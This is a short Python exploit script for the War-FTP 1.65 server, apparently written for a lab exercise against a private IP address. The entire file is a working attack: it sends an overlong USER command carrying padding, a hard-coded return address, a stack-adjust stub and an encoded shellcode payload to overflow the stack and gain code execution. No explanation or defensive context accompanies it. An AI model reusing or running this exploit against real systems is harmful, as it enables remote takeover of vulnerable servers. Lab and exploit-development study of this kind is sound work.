#!/usr/bin/python3

## War-FTP 1.65 Exploit

import socket
from urllib import response 

# define the variables to be sent to the server
ip = '192.168.164.170'
port = 21
returnAddr = b"\x59\x54\xc3\x77"

buf =  b""
buf += b"\xdb\xd4\xd9\x74\x24\xf4\xb8\xda\xa3\xf8\x7c\x5b\x29"
buf += b"\xc9\xb1\x52\x31\x43\x17\x83\xc3\x04\x03\x99\xb0\x1a"
buf += b"\x89\xe1\x5f\x58\x72\x19\xa0\x3d\xfa\xfc\x91\x7d\x98"
buf += b"\x75\x81\x4d\xea\xdb\x2e\x25\xbe\xcf\xa5\x4b\x17\xe0"
buf += b"\x0e\xe1\x41\xcf\x8f\x5a\xb1\x4e\x0c\xa1\xe6\xb0\x2d"
buf += b"\x6a\xfb\xb1\x6a\x97\xf6\xe3\x23\xd3\xa5\x13\x47\xa9"
buf += b"\x75\x98\x1b\x3f\xfe\x7d\xeb\x3e\x2f\xd0\x67\x19\xef"
buf += b"\xd3\xa4\x11\xa6\xcb\xa9\x1c\x70\x60\x19\xea\x83\xa0"
buf += b"\x53\x13\x2f\x8d\x5b\xe6\x31\xca\x5c\x19\x44\x22\x9f"
buf += b"\xa4\x5f\xf1\xdd\x72\xd5\xe1\x46\xf0\x4d\xcd\x77\xd5"
buf += b"\x08\x86\x74\x92\x5f\xc0\x98\x25\xb3\x7b\xa4\xae\x32"
buf += b"\xab\x2c\xf4\x10\x6f\x74\xae\x39\x36\xd0\x01\x45\x28"
buf += b"\xbb\xfe\xe3\x23\x56\xea\x99\x6e\x3f\xdf\x93\x90\xbf"
buf += b"\x77\xa3\xe3\x8d\xd8\x1f\x6b\xbe\x91\xb9\x6c\xc1\x8b"
buf += b"\x7e\xe2\x3c\x34\x7f\x2b\xfb\x60\x2f\x43\x2a\x09\xa4"
buf += b"\x93\xd3\xdc\x6b\xc3\x7b\x8f\xcb\xb3\x3b\x7f\xa4\xd9"
buf += b"\xb3\xa0\xd4\xe2\x19\xc9\x7f\x19\xca\x36\xd7\x85\xa6"
buf += b"\xdf\x2a\xc5\xa7\x43\xa2\x23\xad\x6b\xe2\xfc\x5a\x15"
buf += b"\xaf\x76\xfa\xda\x65\xf3\x3c\x50\x8a\x04\xf2\x91\xe7"
buf += b"\x16\x63\x52\xb2\x44\x22\x6d\x68\xe0\xa8\xfc\xf7\xf0"
buf += b"\xa7\x1c\xa0\xa7\xe0\xd3\xb9\x2d\x1d\x4d\x10\x53\xdc"
buf += b"\x0b\x5b\xd7\x3b\xe8\x62\xd6\xce\x54\x41\xc8\x16\x54"
buf += b"\xcd\xbc\xc6\x03\x9b\x6a\xa1\xfd\x6d\xc4\x7b\x51\x24"
buf += b"\x80\xfa\x99\xf7\xd6\x02\xf4\x81\x36\xb2\xa1\xd7\x49"
buf += b"\x7b\x26\xd0\x32\x61\xd6\x1f\xe9\x21\xf6\xfd\x3b\x5c"
buf += b"\x9f\x5b\xae\xdd\xc2\x5b\x05\x21\xfb\xdf\xaf\xda\xf8"
buf += b"\xc0\xda\xdf\x45\x47\x37\x92\xd6\x22\x37\x01\xd6\x66"
payload = buf
padding = b"\x81\xc4\x18\xfc\xff\xff"

buffer = b"A" * 485 + returnAddr + b"C" * 4 + padding + payload + b"D" * (1100 - 485 - 4 - len(padding) - len(buf))

# create the socket to connect to the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((ip, port))
# because there is a banner we wanna print it out 
response = s.recv(1024)
print(response)

# sending the exploit 
s.send(b"USER " + buffer + b"\r\n")
response = s.recv(1024)
print(response)

# because you have to enter the pass as well 
s.send(b"PASS parrot\r\n")
s.close()
